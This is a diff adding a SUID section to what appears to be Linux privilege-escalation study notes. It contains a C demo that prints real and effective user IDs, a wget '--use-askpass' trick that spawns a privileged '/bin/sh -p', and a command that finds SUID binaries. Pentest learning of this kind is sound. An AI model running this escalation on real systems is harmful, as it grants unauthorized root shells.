@@ -67,3 +67,40 @@ root
 
 
 ```
+# SUID
+```bash
+#+ begin script.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+
+int main(int argc, char **argv) {
+    uid_t uid = getuid(); // Real User ID
+    uid_t eid = geteuid(); // Effective User ID 
+
+    printf("[INFO] - Real User ID: %d\n", uid);
+    printf("[INFO] - Effective user ID: %d\n", eid);
+
+    execv("/usr/bin/touch", (char * []){"/usr/bin/touch", "hello", NULL});
+    
+    return 0;
+}
+
+#+ end script.c
+
+# wget EXAMPLE
+sudo install -m =xs $(which wget) .
+
+TF=$(mktemp)
+chmod +x $TF
+echo -e '#!/bin/sh -p \n/bin/sh -p 1>&0' > $TF
+./wget --use-askpass=$TF 0
+
+# FIND SUID BINARIES
+find / -perm -u=s -type f 2>/dev/null
+
+
+
+
+```
